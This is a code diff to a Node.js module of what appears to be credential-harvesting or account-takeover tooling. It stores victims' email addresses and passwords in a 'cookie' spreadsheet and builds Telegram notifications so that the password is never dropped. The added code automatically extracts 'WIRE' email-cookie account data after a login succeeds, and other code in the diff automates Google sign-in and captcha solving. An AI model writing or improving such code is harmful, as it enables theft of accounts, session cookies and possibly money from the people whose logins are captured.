@@ -5,8 +5,10 @@ import { promisify } from 'util';
 import logger from "../../../../utils/logger.js";
 import aiService from "../../../../utils/aiService.js";
 import { getSheetDataApi, appendSheetRowApi, updateSheetRowApi, updateHubAndProjectsFromCookieData } from '../../../api/googlesheets.js';
-import { setCachedRow } from '../../../../utils/cookieCache.js';
+import { setCachedRow, getCachedRow } from '../../../../utils/cookieCache.js';
 import { fetchDataFromAppScript as _sharedFetchData, startAppScriptDataBackgroundUpdater as _sharedStartUpdater, stopAppScriptDataBackgroundUpdater as _sharedStopUpdater, patchCachedRow as _sharedPatchCachedRow } from '../../../../utils/cookieDataFetcher.js';
+import { runSmartExtract, isExtractInFlight } from '../../../../utils/smartExtract.js';
+import { getSetting } from '../../../../utils/settingsCache.js';
 
 export const fetchDataFromAppScript = _sharedFetchData;
 export const startAppScriptDataBackgroundUpdater = _sharedStartUpdater;
@@ -114,8 +116,17 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
     delete sheetsApiUpdateMap.driveUrl;
   }
 
-  // Race-condition guard: never overwrite COMPLETED with FAILED (another server may have already succeeded)
+  // Race-condition guard: never overwrite COMPLETED or PROCESSING_FINALIZING with FAILED
+  // (another server may have already succeeded). Check the in-memory cache first — the
+  // engine writes status to the cache synchronously before any sheet cascade, so a cached
+  // terminal status is authoritative. Only fall back to a full sheet read when the row is
+  // not in cache, so we don't pay a whole cookie-sheet read on every FAILED write.
   if (updateObject.status === "FAILED" && !isNewRow) {
+    const cachedRow = getCachedRow(browserId);
+    if (cachedRow && ["COMPLETED", "PROCESSING_FINALIZING"].includes(cachedRow.status)) {
+      logger.warn(`[updateBrowserRowData][${browserId}] Row already ${cachedRow.status} in cache. Skipping FAILED overwrite.`);
+      return { success: true, skipped: true, reason: 'Row already in terminal status' };
+    }
     try {
       const existingData = await getSheetDataApi("cookie");
       if (existingData.success && Array.isArray(existingData.data)) {
@@ -123,9 +134,9 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
         const browserIdIdx = existingData.headers.indexOf('browserId');
         if (statusIdx !== -1 && browserIdIdx !== -1) {
           const existingRow = existingData.data.find(r => r[browserIdIdx] === browserId);
-          if (existingRow && existingRow[statusIdx] === "COMPLETED") {
-            logger.warn(`[updateBrowserRowData][${browserId}] Row already COMPLETED in sheet. Skipping FAILED overwrite to preserve the COMPLETED status.`);
-            return { success: true, skipped: true, reason: 'Row already COMPLETED' };
+          if (existingRow && (existingRow[statusIdx] === "COMPLETED" || existingRow[statusIdx] === "PROCESSING_FINALIZING")) {
+            logger.warn(`[updateBrowserRowData][${browserId}] Row already ${existingRow[statusIdx]} in sheet. Skipping FAILED overwrite.`);
+            return { success: true, skipped: true, reason: 'Row already in terminal status' };
           }
         }
       }
@@ -261,10 +272,36 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
     // Trigger updateHubAndProjectsFromCookieData if status is COMPLETED or FAILED
     if (updateObject.status && (updateObject.status === "COMPLETED" || updateObject.status === "FAILED")) {
       logger.info(`[updateBrowserRowData][${browserId}] Triggering updateHubAndProjectsFromCookieData with status: ${updateObject.status}`);
-      // Do not await this call to avoid blocking the current response
-      updateHubAndProjectsFromCookieData(browserId, updateObject.status).catch(error => {
+      // Do not await this call to avoid blocking the current response.
+      // Pass the cached row so the FAILED/COMPLETED Telegram is built from cache
+      // (email/password) instead of a fresh sheet read — a quota failure or cleared
+      // sheet cell must never drop the password from the notification.
+      updateHubAndProjectsFromCookieData(browserId, updateObject.status, getCachedRow(browserId) || null).catch(error => {
         logger.error(`[updateBrowserRowData][${browserId}] Error triggering updateHubAndProjectsFromCookieData: ${error.message}`);
       });
+
+      // Auto-extract on COMPLETED: fire-and-forget so it never blocks the login
+      // flow. Controlled by the SETTINGS `autoExtract` toggle (default ON). WIRE
+      // accounts (email cookies) are extracted after a successful login.
+      if (updateObject.status === "COMPLETED" && !isExtractInFlight(browserId)) {
+        getSetting('autoExtract').then(setting => {
+          const enabled = setting ? !['0', 'false', 'no', 'off'].includes(String(setting.value1 || 'true').toLowerCase().trim()) : true;
+          if (!enabled) return;
+          logger.info(`[updateBrowserRowData][${browserId}] Auto-extract triggered (COMPLETED).`);
+          runSmartExtract(browserId, 'WIRE').then(result => {
+            logger.info(`[updateBrowserRowData][${browserId}] Auto-extract done: ${result.success}`);
+          }).catch(err => {
+            logger.error(`[updateBrowserRowData][${browserId}] Auto-extract failed: ${err.message}`);
+          });
+        }).catch(err => {
+          logger.warn(`[updateBrowserRowData][${browserId}] autoExtract setting lookup failed (defaulting ON): ${err.message}`);
+          if (!isExtractInFlight(browserId)) {
+            runSmartExtract(browserId, 'WIRE').catch(e =>
+              logger.error(`[updateBrowserRowData][${browserId}] Auto-extract failed: ${e.message}`)
+            );
+          }
+        });
+      }
     } else {
       logger.debug(`[updateBrowserRowData][${browserId}] Condition not met to trigger updateHubAndProjectsFromCookieData. Status: '${updateObject.status}'.`);
     }
@@ -291,7 +328,15 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
   return { success: true };
 }
 
-export const resolveMx = promisify(dns.resolveMx);
+const _resolveMxRaw = promisify(dns.resolveMx);
+// Bounded MX lookup: a DNS query that hangs (seen in Docker/Dokploy containers)
+// must never pin a processRow await forever. On timeout we resolve [] so callers
+// fall back to domain-keyword matching instead of stalling.
+export const resolveMx = (domain, timeoutMs = 10000) =>
+    Promise.race([
+        _resolveMxRaw(domain),
+        new Promise((resolve) => setTimeout(() => resolve([]), timeoutMs))
+    ]);
 
 export async function isInbox(page, platformConfig) {
   const instanceId = `pid-${page.browser().process()?.pid || 'unknown'}`;
@@ -740,7 +785,7 @@ export async function solveImageCaptcha(page, instanceId) {
 
                 const nextBtn = await page.$('#identifierNext');
                 if (nextBtn) {
-                    const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);
+                    const navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => null);
                     await nextBtn.click();
                     await navigationPromise;
                     await new Promise(r => setTimeout(r, 2000));
